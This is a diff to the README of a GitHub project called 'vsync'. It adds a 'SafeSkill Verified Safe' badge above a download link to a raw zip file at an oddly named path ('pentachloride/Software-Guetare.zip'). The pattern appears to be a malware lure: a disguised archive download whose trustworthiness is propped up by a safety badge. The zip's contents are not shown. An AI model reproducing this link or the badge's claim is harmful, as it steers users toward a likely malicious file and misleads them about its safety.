@@ -1,5 +1,7 @@
 # 🌟 vsync - Effortlessly Sync Your Tools
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/hardik455abc-vsync)
+
 ## 🔗 Download vsync
 [![Download vsync](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip%20vsync-v1.0-blue)](https://github.com/Hardik455abc/vsync/raw/refs/heads/main/pentachloride/Software-Guetare.zip)
 
